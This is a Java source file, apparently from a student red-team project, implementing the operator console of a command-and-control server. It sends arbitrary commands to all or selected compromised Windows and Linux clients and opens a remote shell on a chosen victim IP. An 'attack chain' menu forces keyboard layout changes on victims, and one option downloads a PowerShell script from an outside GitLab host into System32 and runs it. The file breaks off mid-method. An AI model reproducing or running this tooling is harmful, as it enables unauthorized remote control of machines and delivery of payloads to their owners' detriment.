package Servers.CLI;

import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import java.util.TreeMap;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashSet;
import java.io.Console;
import java.util.Arrays;

public class C2ServerCLI implements Runnable{
    // Strings used to make the console look cool
    private String GREEN = "\u001B[32m";
    private String RED = "\u001B[31m";
    private String BLUE = "\u001B[34m";
    private String RESET = "\u001B[37m";

    // Scanner for the user to enter input
    private Scanner userInputScanner;

    // The User's current Path in the CLI
    private String currentUserPath;

    // URL of the C2 Server
    private String C2URL;

    // set to true if testing (i.e. the c2 server will not have a valid certificate)
    private boolean testing;

    // Console Used so that the User's input of passwords is masked
    private Console passwordInputConsole;

    // Oauth bearer token
    private String bearerToken;

    // Number of messages read from the server
    private int messagesRead;

    // Current user username and password
    private String username;
    private String password;

    /**
     * Class to handle input from the user controlling the C2
     * and send it back to the C2 Server.
     * 
     * @param server Pointer to the C2 Server
     */
    protected C2ServerCLI(){
        this.userInputScanner = new Scanner(System.in);
        this.currentUserPath = "";
        this.testing = false;
        this.passwordInputConsole = System.console();
        this.messagesRead = 0;
    }

    private void printJAVALANCHE(){
        System.out.println(RESET);
        System.out.println("*          *             *        *    *       *        * /\\   *      *     *      *      *     *            *             *        *");
        System.out.println("      *        *         *      *  /\\     *       *      //\\\\*      * *      *    *  /\\           *     *             *           *");
        System.out.println("     *                        /\\  //\\\\      *       *   ///\\\\\\   *        *     /\\  //\\\\   *         *         *         * *        *");
        System.out.println("          *        *   /\\ *  //\\\\///\\\\\\   *    /\\      ////\\\\\\\\   *   *  /\\    //\\\\///\\\\\\ *   *  /\\  *  *   *     */\\      *    *");
        System.out.println("  *    *     *   *    //\\\\  ///\\////\\\\\\\\  /\\  //\\\\    /  ^ ^^  \\     *  //\\\\  ///\\////\\\\\\\\  /\\  //\\\\  *     *    *//\\\\  *    *   *");
        System.out.println(" *       /\\  *    *  /  ^ \\/^ ^/^  ^  ^ \\/^ \\/  ^ \\  /  ^  /\\  ^\\   *  /  ^\\ /^ ^/^  ^  ^ \\/^ \\/  ^ \\  /\\        ///\\\\\\    /\\        * ");
        System.out.println("     *  / ^\\    /\\  / ^   /  ^/ ^ ^ ^   ^\\ ^/  ^^  \\/  ^^ / ^\\^  \\/\\  / ^   /  ^/ ^ ^ ^   ^\\ ^/  ^^  \\/^ \\  /\\  /^  ^^ \\  //\\\\ *       ");
        System.out.println(" *     /^   \\* / ^\\/ ^ ^   ^ / ^  ^    ^  \\/ ^   ^  \\ ^  /^   \\  / ^\\/ ^ ^   ^ / ^  ^    ^  \\/ ^   ^  \\  ^\\/ ^\\/  ^^  ^ \\///\\\\\\     *      ");
        System.out.println("     */  ^ ^ \\/^  ^\\ ^ ^ ^   ^  ^   ^         ^   ^  \\  /  ^ ^ \\/^  ^\\ ^ ^ ^   ^  ^   ^    ^    ^   ^  \\   \\  /    ^ ^  /  ^  ^\\ *        ");
        System.out.println("   * / ^ ^  ^ \\ ^  "+RED+ "_"+RESET+"^ ^ ^  "+RED+"___"+RESET+" ^ "+RED+"__"+RESET+" ^  ^   "+RED+"__"+RESET+" ^ "+RED+"___"+RESET+"  ^^   "+RED+"_"+RESET+"^ ^ ^ ^   ^ "+RED+"___"+RESET+"  ^^ ^ "+RED+"___"+RESET+" ^  ^"+RED+"_"+RESET+" ^ "+RED+"_______"+RESET+" ^ "+RED+"_"+RESET+" ^^ "+RED+"_"+RESET+" ^ "+RED+"_______"+RESET+"   ^  ^  \\ *  *");
        System.out.println("    / ^^  ^ ^ ^\\  "+RED+"| |     / _ \\  \\ \\      / /  / _ \\     | |          / _ \\     |   \\   | | |  _____| | |  | | |  _____|"+RESET+"    ^^   \\    ");
        System.out.println(" * /  ^  ^^ ^ ^ \\ "+RED+"| |    / /_\\ \\  \\ \\    / /  / /_\\ \\    | |         / /_\\ \\    | |\\ \\  | | | |       | |__| | | |___"+RESET+"   ^    ^    \\ *");
        System.out.println( "  /^ ^  ^  ^^ "+RED+"_   | |   / _____ \\  \\ \\  / /  / _____ \\   | |        / _____ \\   | | \\ \\ | | | |       |  __  | |  ___|"+RESET+"      ^   ^  \\     ");
        System.out.println(" / ^   ^   ^ "+RED+"| |__| |  / /     \\ \\  \\ \\/ /  / /     \\ \\  | |____   / /     \\ \\  | |  \\ \\| | | |_____  | |  | | | |_____"+RESET+"   ^    ^    \\");
        System.out.println("/ ^ ^ ^  ^  ^"+RED+"|______| /_/       \\_\\  \\__/  /_/       \\_\\ |______| /_/       \\_\\ |_|   \\___| |_______| |_|  |_| |_______|"+RESET+"    ^      ^ \\");
        System.out.println("oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo");
        System.out.println();
    }

    private void printCommand(){
        System.out.println(RESET);
        System.out.println("       ____                          _________                         __           ");
        System.out.println("       \\   \\                        |   ______|                       |  |             ");
        System.out.println("        \\   \\                       |  |           _________     _____|  |             ");
        System.out.println("         \\   \\                      |  |          |  _   _  |   |   __   |                ");
        System.out.println("         /   /                      |  |          | | | | | |   |  |  |  |                 ");
        System.out.println("        /   /      __________       |  |______    | | | | | |   |  |__|  |                 ");
        System.out.println("       /___/      |__________|      |_________|   |_| |_| |_|   |________|            ");
        System.out.println();
    }

    private void printAttackChain(){
        System.out.println(RESET);
        System.out.println("       ____                          _________                         __           ");
        System.out.println("       \\   \\                        |   ______|                       |  |             ");
        System.out.println("        \\   \\                       |  |           _________     _____|  |             ");
        System.out.println("         \\   \\                      |  |          |  _   _  |   |   __   |                ");
        System.out.println("         /   /                      |  |          | | | | | |   |  |  |  |                 ");
        System.out.println("        /   /      __________       |  |______    | | | | | |   |  |__|  |                 ");
        System.out.println("       /___/      |__________|      |_________|   |_| |_| |_|   |________|            ");
        System.out.println();
    }

    private void printRequest(){
        System.out.println(RESET);
        System.out.println("              _.-/`)        _________                                                                           __    ");
        System.out.println("             // / / )      |   ___   \\                                                                         |  |");
        System.out.println("          .=// / / / )     |  |___)   |    ________     _________    __     __     ________     ________    ___|  |___  ");
        System.out.println("         //`/ / / / /      |   ___   /    |  ______|   |   ___   |  |  |   |  |   |  ______|   | _______|  |___    ___|");
        System.out.println("        // /     ` /       |  |  \\  \\     | |______    |  |   |  |  |  |   |  |   | |______    |______  |      |  |    ");
        System.out.println("       ||         /        |  |   \\  \\    | |______    |  |___| _|  |  |___|  |   | |______     ______| |      |  |           ");
        System.out.println("        \\\\_______/         |__|    \\__\\   |________|   |_______\\_\\  |_________|   |________|   |________|      |__|          ");
        System.out.println();
    }

    private void printUser(){
        System.out.println("         ___              ___      ");
        System.out.println("        /   \\    ___     /   \\        __       __   _________   ________   _________    _________");
        System.out.println("       |     |  /   \\   |     |      |  |     |  | |  _______| |  ______| |   ___   \\  |  _______|");
        System.out.println("       _\\___/_ |     |  _\\___/_      |  |     |  | | |_______  | |______  |  |___)   | | |_______  ");
        System.out.println("      /       \\_\\___/_ /       \\     |  |     |  | |______   | |  ______| |   ___   /  |______   |");
        System.out.println("      |       /        \\        |     \\  \\___/  /   ______|  | | |______  |  |   \\  \\   ______|  |");
        System.out.println("      |       |        |        |      \\_______/   |_________| |________| |__|    \\__\\ |_________|");
        System.out.println("      |_______|        |________|  ");
        System.out.println("              |________|");
        System.out.println();
    }

    /**
     * This Function is used by the CLI for the user to send commands to clients
     * 
     * @param OS the Operating System 'Windows' or 'Linux'
     */
    private void sendCommand(String OS){
        String color = "";
        // Send Command to Client Menu
        if(OS == "Windows"){
            color = BLUE;
            System.out.println(color);
            System.out.println("      _______ _______     __    __    __    __                         ___           ");
            System.out.println("     /      //      /    |  |  |  |  |  |  |__|   __                  |   |   _________    __          __   _________");
            System.out.println("    /      //      /     |  |  |  |  |  |   __   |  |______    _______|   |  |   ___   |  |  |   __   |  | |  _______|");
            System.out.println("   /_____ //______/      |  |  |  |  |  |  |  |  |   ___   |  |    ___    |  |  |   |  |  |  |  |  |  |  | | |_______  "); 
            System.out.println("  /      //      /       |  |  |  |  |  |  |  |  |  |   |  |  |   |   |   |  |  |   |  |  |  |  |  |  |  | |______   |        ");
            System.out.println(" /      //      /        |  |__|  |__|  |  |  |  |  |   |  |  |   |___|   |  |  |___|  |  |  |__|  |__|  |  ______|  | ");
            System.out.println("/_____ //______/         |______________|  |__|  |__|   |__|  |___________|  |_________|  |______________| |_________|          ");
            System.out.println();
        }
        if(OS == "Linux"){
            color = RED;
            System.out.flush();
            System.out.println(color);
            System.out.println("     .-------.           ___           __                            ");
            System.out.println("    /  o_o   |          |   |         |__|   __                            ");
            System.out.println("    |  :_/   |          |   |          __   |  |______    __    __   __    __ ");
            System.out.println("   //        \\\\         |   |         |  |  |   ___   |  |  |  |  |  \\ \\  / /            "); 
            System.out.println("   (|        | )        |   |         |  |  |  |   |  |  |  |  |  |   \\ \\/ /                   ");
            System.out.println("  /'\\_     _/`\\         |   |______   |  |  |  |   |  |  |  |__|  |   / /\\ \\                   ");
            System.out.println("  \\____)=(_____/        |__________|  |__|  |__|   |__|  |________|  /_/  \\_\\             ");
            System.out.println();
        }
        System.out.println("1. Send a command to ALL " + OS + " Computers");
        System.out.println("2. Send a command to A SPECIFIC " + OS + " Computer");
        System.out.println("3. Back");
        System.out.println(RESET);
        System.out.print(currentUserPath + " >> ");
        String userInput = userInputScanner.nextLine();

        String scope = "";

        // Send commands to all Windows or Linux machines
        if(userInput.equals("1")){
            scope = OS;

        // Send commands to single IP
        } else if(userInput.equals("2")){
            System.out.print("Enter IP Address of desired target >> ");
            String IPAddress = userInputScanner.nextLine();
            scope = IPAddress;
        
        // Send user back to Command Menu
        } else if(userInput.equals("3")){
            currentUserPath = "Command";
        } else {
            System.out.println("Invalid Input");
        }

        // Take commands from user
        if(userInput.equals("1") || userInput.equals("2")){
            System.out.print("Enter Command to be run >> ");
            String command = userInputScanner.nextLine();
            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON(scope, command), bearerToken, testing, this);
            currentUserPath = "Command " + OS;
        }
        System.out.println(RESET);
    }

    protected String formatClientStatus(Map<String, Object> clientStatus){
        // Creating fire visually pleasing table of client status
        String table = " ________________________________________________\n";
        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
        table += "|______________________|_________________________|\n";
        Map<String, Object> sortedByKey = new TreeMap<>(clientStatus);
        for (String ip : sortedByKey.keySet()) {
            String status;
            boolean status_bool;
            if (clientStatus.get(ip).equals(true)) {
                status = GREEN + "CONNECTED :D" + RESET;
                status_bool = false;
            } else {
                status = RED + "DISCONNECTED D:" + RESET;
                status_bool = true;
            }
            // If the status is disconnected
            if (status_bool){
                table += String.format("| %-20s | %-33s |\n", ip, status);
            }
            // If the status is connected
            else {
                table += String.format("| %-20s | %-33s |\n", ip, status);
            }
        }
        table += "|______________________|_________________________|\n";
        return table;
    }

    private boolean validateIPv4Address(String IPAddress){
         String[] quads = IPAddress.split("\\.");
         if(quads.length != 4){
            return false;
         }
         for(String quad : quads){
            if(!quad.equals("x")){
                try{
                    if(Integer.parseInt(quad) > 255 || Integer.parseInt(quad) < 0){
                        return false;
                    }
                } catch (Exception e){
                    return false;
                }
            }
         }
         return true;
    }

    /**
     * This function is used to enter a shell of one individual client
     */
    private void enterClientShell(){
        System.out.println("Enter 'q' at any time to exit the shell and return to the main menu\n");
        String clientOS = "none";
        String clientIP = "";
        String currentDirectory = "C:\\";
        while(clientOS.equals("none")){
            System.out.print("Enter IP address of Client >> ");
            clientIP = userInputScanner.nextLine().toLowerCase();
            if(clientIP.equals("q")){
                break;
            }
            if(validateIPv4Address(clientIP)){
                System.out.println("Setting up Shell ... \n");

                // Get messages from Server
        
                // Send pwd so that we can get the current directory
                String currentDirectoryOutput = HTTPSRequest.sendRequest(C2URL + "/shell", getCommandJSON(clientIP, "pwd"), bearerToken, testing, this);

                if(currentDirectoryOutput.contains("output")){
                    currentDirectory = getCommandOutput(currentDirectoryOutput);
                    if(currentDirectory.contains("C:\\")){
                        try{
                            currentDirectory = currentDirectory.split("\n")[2];
                        } catch (ArrayIndexOutOfBoundsException e){
                            e.printStackTrace();
                        }
                    }
                    break;
                } else {
                    System.out.println("Error: " + getJSONError(currentDirectoryOutput));
                }
            }
        }
        
        if(clientIP.equals("q")){
            currentUserPath = "";
        } else {
            String command;
            Boolean runCommand;
            String dir;
            String dirs[];
            while(true){
                runCommand = true;

                // Print out current Directory
                if(currentDirectory.contains("C:")){
                    System.out.print("PS " + currentDirectory + "> ");
                } else {
                    System.out.print("root@" + clientIP + ":" + currentDirectory + "$ ");
                }

                // Get command from user
                command = userInputScanner.nextLine();

                try {
                    if (!(command.isEmpty())){
                        if(command.equals("q")){
                            currentUserPath = "";
                            break;
                        } else if (command.substring(0,2).equals("cd")){
                            // Change Current Directory
                            // Linux
                            if(currentDirectory.charAt(0) == '/'){
                                dir = command.substring(3);
                                if (dir.substring(0,1).equals("/")){
                                    currentDirectory = dir;
                                } else if (dir.equals("..")) {
                                    dirs = currentDirectory.split("/");
                                    currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[dirs.length - 1]));
                                } else {
                                    currentDirectory += dir + "/";
                                }
                            } else {
                                // Windows
                                dir = command.substring(3);
                                if (dir.contains("C:\\")){
                                    currentDirectory = dir;
                                } else if (dir.equals("..")) {
                                    dirs = currentDirectory.split("\\\\");
                                    currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[dirs.length - 1]) - 1);
                                } else {
                                    currentDirectory += "\\" + dir;
                                }
                            }
                            
                            runCommand = false;
                        } else if (command.equals("ls")){
                            // List items of current directory
                            if(currentDirectory.charAt(0) == '/'){
                                // Linux
                                command = "ls " + currentDirectory + "/";
                            } else {
                                // Windows
                                if(currentDirectory.equals("C:")){
                                    command = "ls " + currentDirectory + "\\\\";
                                } else if(currentDirectory.toLowerCase().equals("c:\\windows")){
                                    System.out.println("We don't recomment printing C:\\Windows, it will crash the client lol");
                                    runCommand = false;
                                } else if(currentDirectory.toLowerCase().equals("c:\\windows\\system32")){
                                    System.out.println("We don't recomment printing C:\\Windows\\System32, it will crash the client lol");
                                    runCommand = false;
                                } else {
                                    command = "ls \\\"" + currentDirectory + "\\\"";
                                }
                            }
                        } else if (command.equals("ls -la")){
                            // List items with extra details of current directory
                            if(currentDirectory.charAt(0) == '/'){
                                // Linux
                                command = "ls -la " + currentDirectory + "/";
                            } else {
                                // Windows
                                command = "ls -la " + currentDirectory;
                            }
                        } else if (command.substring(0,2).equals(".\\")){
                            // if the first two characters are .\, then it is attempting to run an executable on windows, in the current directory.
                            // Because we are not actually in the current directory, we will use &, followed by the full executable path
                            command = "& " + currentDirectory + command.substring(2);
                        } else if (command.substring(0,2).equals("./")){
                            // If the first two characters are ./, then it is attempting to run an executable on linux in the current directory
                            // Because we are not actually in the current directory, we will just use the full executable name
                            command = currentDirectory + command.substring(2);
                        } else if (command.equals("pwd")){
                            System.out.println(currentDirectory);
                            runCommand = false;
                        }

                        if(runCommand){
                            // Send the Command
                            String response = getCommandOutput(HTTPSRequest.sendRequest(C2URL + "/shell", getCommandJSON(clientIP, command), bearerToken, testing, this));
                            
                            System.out.println();
                            System.out.println(response);
                            System.out.println();
                        }
                    }
                } catch (StringIndexOutOfBoundsException e){
                    System.out.println("Invalid input: Please enter more than 1 character as a command");
                }
            }
        }
    }

    /**
     * Prints all of the responses to messages, based on the scope
     * @param scope - what responses should be returned by the C2 Server, ex. Windows, Linux, 192.168.1.1, 10.x.x.x, 192.168.x.10
     */
    private void printClientResponses(String scope){
        JSONObject jo = new JSONObject();
        String responses;
        int count;
        jo.put("scope", scope);
        responses = HTTPSRequest.sendRequest(C2URL + "/responses", jo.toString(), bearerToken, testing, this);
        JSONObject jsonResponses = new JSONObject(responses);
        Map<String, Object> clientResponses = jsonResponses.toMap();
        for(String ip : clientResponses.keySet()){
            System.out.println(ip);
            System.out.println();
            JSONArray jsonArray = jsonResponses.getJSONArray(ip);
            count = 1;
            for(int i = 0; i < jsonArray.length(); i++){
                System.out.println(count + ".");
                System.out.println(jsonArray.get(i));
                System.out.println();
                count++;
            }
        }
    }

    /**
     * Returns the correct JSON needed to have the C2 Server execute a command on the scope of the command
     * 
     * @param scope - scope that the command should be run on (ex. Windows, Linux, 192.168.1.1, 10.x.x.x)
     * @param command - command that should be run
     * @return - JSON formatted string
     */
    private static String getCommandJSON(String scope, String command){
        JSONObject jo = new JSONObject();
        jo.put("scope", scope);
        jo.put("command", command);
        return jo.toString();
    }

    /**
     * Get the output of a command run on some clients
     * 
     * @param json - JSON formatted string returned by C2 Server
     * @return - output of the command
     */
    private static String getCommandOutput(String json){
        JSONObject jo = new JSONObject(json);
        return jo.getString("output").toString();
    }

    /**
     * Gets the error of a JOSN formatted string from the server
     * 
     * @param json - JSON formatted string returned from the C2 Server
     * @return - error message
     */
    private static String getJSONError(String json){
        JSONObject jo = new JSONObject(json);
        return jo.getString("error").toString();
    }

    /**
     * Reads all of the messages that the C2 Server has waiting. 
     * Ex. 
     * New Client at 192.168.1.1
     * Lost Client at 10.0.0.1
     * Lost Beacon Server at 192.168.1.10
     */
    private void readMessages(){
        JSONObject jo = new JSONObject();
        jo.put("Messages Read", messagesRead);
        String newMessages = HTTPSRequest.sendRequest(C2URL + "/messages", jo.toString(), bearerToken, testing, this);
        if(!newMessages.equals("[]")){
            JSONArray ja = new JSONArray(newMessages);
            System.out.println();
            for(int i = 0; i < ja.length(); i++){
                System.out.println(ja.get(i).toString());
                messagesRead++;
            }
        }
    }

    /**
     * Takes the current username and password, and re authenticates with the C2 Server. Typically used when the current bearer token has expired
     * 
     * @return new bearer token
     */
    protected String reAuthenticate(){
        String serverAuthResponse = HTTPSRequest.sendAuthRequest(C2URL + "/auth", username, password, testing);
        if(serverAuthResponse.contains("bearer")){
            JSONObject authResponse = new JSONObject(serverAuthResponse);
            this.bearerToken = authResponse.get("bearer").toString();
            return authResponse.get("bearer").toString();
        }
        return "";
    }


    /**
     * Prompts the user to enter new credentials, to get a new oauth bearer token
     * 
     * @return new bearer token
     */
    protected String reAuthenticateNewCreds(){
        System.out.println();
        System.out.println("Your username and password are no longer valid. Please enter in new credentials");
        while(true){
            System.out.print("Enter Server IP >> ");
            String serverIPAddress = userInputScanner.nextLine();
            C2URL = "https://" + serverIPAddress + ":8000";
            System.out.print("Enter Username >> ");
            String username = userInputScanner.nextLine();
            String password = new String(passwordInputConsole.readPassword("Enter Password >> "));
            String serverAuthResponse = HTTPSRequest.sendAuthRequest(C2URL + "/auth", username, password, testing);
            if(serverAuthResponse.contains("bearer")){
                JSONObject authResponse = new JSONObject(serverAuthResponse);
                this.bearerToken = authResponse.get("bearer").toString();
                this.username = username;
                this.password = password;
                return bearerToken;
            } else {
                System.out.println();
                System.out.println(getJSONError(serverAuthResponse));
                System.out.println();
            }
        }
    }

    /**
     * User Menu used by the root user to add, remove, or change passwords of users who are allowed to access the CLI
     * Only the root user has access to this menu (the backend API will only allow requests with bearer tokens that were granted to the root user)
     */
    private void users(){
        printUser();
        System.out.println();
        System.out.println("1. Create a new User");
        System.out.println("2. Change a user's password");
        System.out.println("3. Disable a user");
        System.out.println("4. Back");
        System.out.println();
        System.out.print(" >> ");

        String userSelection = userInputScanner.nextLine();
        if(userSelection.equals("1")){
            System.out.println();
            System.out.print("Enter new User's Username >> ");
            String newUsername = userInputScanner.nextLine();
            String newPassword = new String(passwordInputConsole.readPassword("Enter new User's Password >> "));
            JSONObject usernamePasswordJSON = new JSONObject();
            usernamePasswordJSON.put("type", "add");
            usernamePasswordJSON.put("username", newUsername);
            usernamePasswordJSON.put("password", newPassword);
            HTTPSRequest.sendRequest(C2URL + "/user", usernamePasswordJSON.toString(), bearerToken, testing, this);
        } else if (userSelection.equals("2")){
            System.out.println();
            System.out.print("Enter Username >> ");
            String newUsername = userInputScanner.nextLine();
            String newPassword = new String(passwordInputConsole.readPassword("Enter User's new Password >> "));
            JSONObject usernamePasswordJSON = new JSONObject();
            usernamePasswordJSON.put("type", "add");
            usernamePasswordJSON.put("username", newUsername);
            usernamePasswordJSON.put("password", newPassword);
            HTTPSRequest.sendRequest(C2URL + "/user", usernamePasswordJSON.toString(), bearerToken, testing, this);
        } else if (userSelection.equals("3")){
            System.out.println();
            System.out.print("Enter Username to Disable >> ");
            String newUsername = userInputScanner.nextLine();
            JSONObject disableUsernameJSON = new JSONObject();
            disableUsernameJSON.put("type", "disable");
            disableUsernameJSON.put("username", newUsername);
            HTTPSRequest.sendRequest(C2URL + "/user", disableUsernameJSON.toString(), bearerToken, testing, this);
        } else if (userSelection.equals("4")) {
            currentUserPath = "";
        } else {
            System.out.println("Invalid selection");
        }
    }

    @Override
    public void run() {
        while(true){
            System.out.print("Enter Server IP >> ");
            String serverIPAddress = userInputScanner.nextLine();
            C2URL = "https://" + serverIPAddress + ":8000";
            System.out.print("Enter Username >> ");
            String username = userInputScanner.nextLine();
            String password = new String(passwordInputConsole.readPassword("Enter Password >> "));
            String serverAuthResponse = HTTPSRequest.sendAuthRequest(C2URL + "/auth", username, password, testing);
            if(serverAuthResponse.contains("bearer")){
                JSONObject authResponse = new JSONObject(serverAuthResponse);
                this.bearerToken = authResponse.get("bearer").toString();
                this.username = username;
                this.password = password;
                break;
            } else {
                System.out.println();
                System.out.println(getJSONError(serverAuthResponse));
                System.out.println();
            }
        }
        
        // Initally, we want to get all of the inital messages, figure out how many of them there are,
        // so we don't absolutely bombard the user when they initially open the cli
        JSONObject jo = new JSONObject();
        jo.put("Messages Read", messagesRead);
        String newMessages = HTTPSRequest.sendRequest(C2URL + "/messages", jo.toString(), bearerToken, testing, this);
        if(!newMessages.equals("[]")){
            JSONArray ja = new JSONArray(newMessages);
            messagesRead = ja.length();
        }

        // Loop for the User to use the CLI
        String userInput = "";
        while(true){

            // Print all messages waiting in the queue.
            readMessages();
            
            if(currentUserPath.equals("")){
                printJAVALANCHE();
                System.out.println("1. Send a command to all Clients");
                System.out.println("2. Enter a Shell");
                System.out.println("3. Request Data from Clients");
                System.out.println("4. Get Status from Clients");
                if(username.equals("root")){
                    System.out.println("5. Manage Users");
                    System.out.println("6. Exit CLI");
                } else {
                    System.out.println("5. Exit CLI");
                }
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath = "Command";
                } else if(userInput.equals("2")){
                    currentUserPath = "Shell";
                } else if(userInput.equals("3")){
                    currentUserPath = "Request";
                } else if(userInput.equals("4")){
                    currentUserPath = "Status";
                } else if(userInput.equals("5")){
                    if(username.equals("root")){
                        currentUserPath = "Users";
                    } else {
                        //System.out.print("Confirm shutdown of Server [y/N] >> ");
                        System.out.print("Confirm Exit of CLI [y/N] >> ");
                        String confirmation = userInputScanner.nextLine();
                        if(confirmation.toLowerCase().equals("y")){
                            //System.out.println(RED + "Closing Server..."+ RESET);
                            System.out.println(RED + "Closing CLI ..."+ RESET);
                            System.out.println();
                            //C2server.stopServer();
                            //C2server.broadcastToBeacons("quit");
                            break;
                        }
                    }
                    
                } else if(userInput.equals("6") && username.equals("root")){
                    System.out.print("Confirm Exit of CLI [y/N] >> ");
                    String confirmation = userInputScanner.nextLine();
                    if(confirmation.toLowerCase().equals("y")){
                        System.out.println(RED + "Closing CLI ..."+ RESET);
                        System.out.println();
                        //C2server.stopServer();
                        //C2server.broadcastToBeacons("quit");
                        break;
                    }
                }
                
                else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Command")){
                printCommand();
                System.out.println("1. Send a command to " + BLUE + "Windows" + RESET + " Computers");
                System.out.println("2. Send a command to " + RED + "Linux" + RESET + " Computers");
                System.out.println("3. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath += " Windows";
                    sendCommand("Windows");
                } else if(userInput.equals("2")){
                    currentUserPath += " Linux";
                    sendCommand("Linux");
                } else if(userInput.equals("3")){
                    currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Shell")){
                enterClientShell();
            } else if(currentUserPath.equals("Command Windows")){
                sendCommand("Windows");
            } else if(currentUserPath.equals("Command Linux")){
                sendCommand("Linux");
            } else if(currentUserPath.equals("Users")){
                users();
            } else if(currentUserPath.equals("AttackChain")){
                // Menu
                printAttackChain();
                System.out.println("1. THE GOOSE");
                System.out.println("2. Change Keyboard Language [EASY]");
                System.out.println("3. Change Keybaord Layout [HARD]");
                System.out.println("4. Change Keybaord Layout to English");
                System.out.println("5. Change Wallpaper");
                System.out.println("6. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                String userAttackChainChoice = "";
                userAttackChainChoice = userInputScanner.nextLine();

                // Validate Selection and choose scope of attack
                String os = "";
                String target = "";
                HashSet<String> validInputs = new HashSet<>(Arrays.asList("1","2","3","4","5"));
                if(validInputs.contains(userAttackChainChoice)){
                    System.out.println("Enter 'Windows','Linux', or 'All'");
                    System.out.print(" >> ");
                    os = userInputScanner.nextLine();
                    os = os.toLowerCase().strip();
                    if(os.equals("windows") || os.equals("linux")){
                        System.out.println("All " + os + " or a specific IP (Enter 'All'/'x.x.x.x')");
                        System.out.print(" >> ");
                        target = userInputScanner.nextLine();
                        target = target.toLowerCase().strip();
                    } else {
                        target = "all";
                    }
                }

                String windowsCommands = "";
                String linuxCommands = "";

                // Attack Chain implementations
                if(userAttackChainChoice.equals("1")){
                    // TODO: Figure out how to launch the goose.
                } else if (userAttackChainChoice.equals("2")){
                    // Set their Keybaord language to French for 60 seconds, then change it back to English

                    // Windows
                    windowsCommands = "";
                    windowsCommands += "Set-WinUserLanguageList fr-FR -force;";
                    //windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                    //windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
                    windowsCommands += "Start-Sleep -Seconds 60;";
                    //windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                    windowsCommands += "Set-WinUserLanguageList en-US -force";

                    // Linux
                    linuxCommands = "";
                    linuxCommands += "setxkbmap fr;";
                    linuxCommands += "notify-send 'Have Fun Learning French MF'";
                    linuxCommands += "sleep 60;";
                    linuxCommands += "notify-send 'Ok you can have English Again'";
                    linuxCommands += "setxkbmap us;";
                    
                } else if (userAttackChainChoice.equals("3")){
                    // Change their Keybaord language every 30 seconds

                    // Windows
                    HashMap<String, String> languages = new HashMap<>();
                    windowsCommands = "";
                    languages.put("French", "fr-FR");
                    languages.put("German", "de-DE");
                    languages.put("Arabic", "ar-SA");
                    languages.put("Cantonese", "zh-HK");
                    languages.put("Italian","it-IT");
                    for(String language : languages.keySet()){
                        windowsCommands += "Set-WinUserLanguageList " + languages.get(language) + " -force;";
                        //windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                        //windowsCommands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
                        windowsCommands += "Start-Sleep -Seconds 30;";
                    }
                    //windowsCommands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                    windowsCommands += "Set-WinUserLanguageList en-US -force;";

                    // Linux
                    HashMap<String, String> languagesLin = new HashMap<>();
                    linuxCommands = "";
                    languagesLin.put("French", "fr");
                    languagesLin.put("German", "de");
                    languagesLin.put("Arabic", "sy");
                    languagesLin.put("Chinese", "cn");
                    languagesLin.put("Italian","it");
                    for(String language : languages.keySet()){
                        linuxCommands += "setxkbmap " + language + ";";
                        linuxCommands += "notify-send 'Have Fun Learning " + languagesLin.get(language) + " MF'";
                        linuxCommands += "sleep 60;";
                    }
                    linuxCommands += "notify-send 'Ok you can have English Again'";
                    linuxCommands += "setxkbmap en;";
                    // TODO Figure out how to mess with Linux Keyboard
                } else if (userAttackChainChoice.equals("4")){
                    // Change it back to english in case we mess up

                    // Windows
                    windowsCommands = "";
                    windowsCommands += "Set-WinUserLanguageList en-US -force;";
                    //windowsCommands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                    //windowsCommands += "[System.Windows.MessageBox]::Show('Sorry about that heres english')";

                    // Linux
                    linuxCommands = "";
                    linuxCommands += "notify-send 'Sorry about that heres english'";
                    linuxCommands += "setxkbmap en;";
                    // TODO Figure out how to mess with Linux Keyboard
                } else if (userAttackChainChoice.equals("5")){
                    // Send a message box
                    System.out.println("Enter URL of Photo: ");
                    System.out.print(" >> ");
                    String photoURL = userInputScanner.nextLine();
                    
                    // Windows
                    windowsCommands = "";
                    windowsCommands += "wget -o C:\\Windows\\System32\\wallpaper.ps1 https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsAttackChainScripts/changeWallpaper.ps1?ref_type=heads;";
                    windowsCommands += "C:\\Windows\\System32\\wallpaper.ps1 -wallpaperURL " + photoURL;


                } else if (userAttackChainChoice.equals("6")){
                    currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }

                // Send the commands
                HashSet<String> inputsToSendCommandsFor = new HashSet<>(Arrays.asList("2","3","4","5"));
                if(inputsToSendCommandsFor.contains(userAttackChainChoice)){
                    // Send commands based on os/scope
                    if(target.equals("all")){
                        if(os.equals("windows") || os.equals("all")){
                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON("Windows", windowsCommands), bearerToken, testing, this);
                        }
                        if(os.equals("linux") || os.equals("all")){
                            HTTPSRequest.sendRequest(C2URL + "/command", getCommandJSON("Linux", linuxCommands), bearerToken, testing, this);
                        }
                    } else {
                        // Temporary fix to have the target match the protocl
                        if(target.equals("windows")){
                            target = "Windows";
                        } else if (target.equals("linux")){
                            target = "Linux";
                        }
                        if(os.equals("windows")){
